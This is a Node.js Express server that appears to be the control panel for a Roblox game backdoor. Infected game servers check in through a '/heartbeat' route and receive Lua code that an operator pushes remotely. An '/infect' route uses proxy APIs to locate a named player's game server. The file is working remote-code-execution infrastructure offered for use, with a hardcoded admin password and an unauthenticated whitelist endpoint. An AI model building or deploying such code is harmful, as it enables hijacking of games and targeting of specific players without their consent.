const express = require('express');
const path = require('path');
const axios = require('axios'); // Ensure axios is at the top
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

// Global State
let savedLua = "-- No code pushed yet";
let activeGames = {};
let whitelist = [];
const ADMIN_PASSWORD = "Alt";

// --- UTILITY: Conversion & Search Logic ---

// Converts username to UserId using RoProxy
async function getUserId(username) {
    try {
        const response = await axios.post('https://users.roproxy.com/v1/usernames/users', {
            usernames: [username],
            excludeBannedUsers: true
        });
        return response.data.data?.[0]?.id || null;
    } catch (err) { return null; }
}

// Scans all active server nodes for a specific user
async function findAndExecute(targetUserId) {
    try {
        // 1. Locate WHERE the user is first via Presence
        const presenceResp = await axios.post('https://presence.roproxy.com/v1/presence/users', {
            userIds: [targetUserId]
        });
        const presence = presenceResp.data.userPresences?.[0];

        if (!presence || presence.userPresenceType !== 2) return { status: "not_found", message: "User not in-game" };

        // 2. Scan the nodes for that specific PlaceId
        const response = await axios.get(`https://games.roproxy.com/v1/games/list-instances/Public?placeId=${presence.placeId}`);
        const serverList = response.data.data || [];
        
        const isFound = serverList.some(server => server.playerIds.includes(targetUserId));

        if (isFound) {
            console.log(`Nexus match found for ${targetUserId} in Place ${presence.placeId}`);
            return { status: "success", placeId: presence.placeId };
        }
        return { status: "not_found", message: "User not in server nodes" };
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

// --- ENDPOINTS ---

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// Heartbeat: Handles script delivery and active game tracking
app.post('/heartbeat', (req, res) => {
    const { jobId, gameName, playerCount, userId, placeId } = req.body;
    
    // Whitelist check
    if (userId && whitelist.length > 0 && !whitelist.includes(userId.toString())) {
        return res.send("-- Not Whitelisted");
    }

    if (jobId && placeId) {
        activeGames[jobId] = { 
            name: gameName || "Unknown", 
            players: playerCount || 0, 
            placeId: placeId, 
            lastSeen: Date.now(), 
            targetLua: activeGames[jobId]?.targetLua || null 
        };
    }

    let responseCode = (activeGames[jobId] && activeGames[jobId].targetLua) ? activeGames[jobId].targetLua : savedLua;
    if (activeGames[jobId]) activeGames[jobId].targetLua = null; 
    res.send(responseCode);
});

// Infection: The dynamic search-and-find route
app.get('/infect', async (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).send("Missing username");

    const userId = await getUserId(username);
    if (!userId) return res.status(404).send("User not found");

    const result = await findAndExecute(userId);
    res.json(result);
});

app.post('/push-lua', (req, res) => {
    const { lua, password, targetId } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(403).send("Denied");
    
    if (targetId && activeGames[targetId]) activeGames[targetId].targetLua = lua;
    else savedLua = lua;
    res.send("Pushed");
});

app.get('/get-games', (req, res) => {
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    const now = Date.now();
    // Cleanup inactive servers (timeout > 30s)
    for (const id in activeGames) {
        if (now - activeGames[id].lastSeen > 30000) delete activeGames[id];
    }
    res.json(activeGames);
});

app.post('/update-whitelist', (req, res) => {
    const { id, action } = req.body;
    const idStr = id.toString();
    if (action === 'add' && !whitelist.includes(idStr)) whitelist.push(idStr);
    if (action === 'remove') whitelist = whitelist.filter(i => i !== idStr);
    res.send("Updated");
});

app.listen(PORT, '0.0.0.0', () => console.log(` Nexus Online | Port: ${PORT}`));
